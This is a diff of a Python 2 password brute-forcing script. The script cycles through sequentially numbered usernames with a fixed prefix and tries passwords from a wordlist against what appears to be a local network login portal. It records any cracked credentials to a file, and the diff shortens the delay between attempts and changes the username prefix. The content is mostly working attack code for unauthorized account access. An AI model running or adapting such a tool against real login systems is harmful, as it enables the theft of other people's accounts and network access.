@@ -13,7 +13,7 @@ import urllib2
 
 user_list = open("userlist.txt","a")
 pass_list = open("passwordlist.txt","r")
-user_name = "civ15"
+user_name = "mec13"
 host_url = 'http://172.16.1.100:8090/httpclient.html'
 
 def connectivity():
@@ -26,7 +26,7 @@ def connectivity():
 	return False
 
 flag = True
-usernumber_min = 1
+usernumber_min = 01
 usernumber_max = 70
 
 if connectivity() == True:
@@ -71,11 +71,11 @@ if connectivity() == True:
 			#----------------------------------------------------------------------------
 			if return_value != -1:
 				print '--->hurrah new pasword found user name is   Username: ',usernumber_min
-				user_list.write('Username: 15'+str(usernumber_min)+' Password:'+passwd)
+				user_list.write('Username:'+ user_name +str(usernumber_min)+' Password:'+passwd)
 				user_list.write("\n")
 			usernumber_min = usernumber_min  + 1
 		
-		time.sleep(5)
+		time.sleep(2)
 		usernumber_min = 1
 else:
 	print 'No connectivity to host'
